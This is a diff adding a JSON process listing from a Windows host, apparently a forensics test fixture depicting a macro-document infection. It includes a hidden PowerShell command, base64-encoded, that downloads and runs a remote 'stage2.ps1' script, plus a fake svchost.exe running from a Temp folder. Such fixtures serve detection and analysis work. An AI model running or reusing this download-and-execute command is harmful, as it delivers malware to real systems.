@@ -1,0 +1,99 @@
+
+[
+  {
+    "Args": null,
+    "PID": 4,
+    "Process": "System",
+    "__children": []
+  },
+  {
+    "Args": "\\SystemRoot\\System32\\smss.exe",
+    "PID": 312,
+    "Process": "smss.exe",
+    "__children": []
+  },
+  {
+    "Args": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768",
+    "PID": 428,
+    "Process": "csrss.exe",
+    "__children": []
+  },
+  {
+    "Args": "wininit.exe",
+    "PID": 504,
+    "Process": "wininit.exe",
+    "__children": []
+  },
+  {
+    "Args": "winlogon.exe",
+    "PID": 560,
+    "Process": "winlogon.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\services.exe",
+    "PID": 640,
+    "Process": "services.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\lsass.exe",
+    "PID": 652,
+    "Process": "lsass.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+    "PID": 788,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k RPCSS -p",
+    "PID": 860,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+    "PID": 1024,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\Explorer.EXE",
+    "PID": 2164,
+    "Process": "explorer.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Users\\l.bernard\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
+    "PID": 3020,
+    "Process": "OneDrive.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+    "PID": 3100,
+    "Process": "chrome.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\l.bernard\\Downloads\\Facture_2026-10.docm\"",
+    "PID": 3412,
+    "Process": "WINWORD.EXE",
+    "__children": []
+  },
+  {
+    "Args": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==",
+    "PID": 4720,
+    "Process": "powershell.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Users\\l.bernard\\AppData\\Local\\Temp\\svchost.exe -k netsvcs",
+    "PID": 5120,
+    "Process": "svchost.exe",
+    "__children": []
+  }
+]
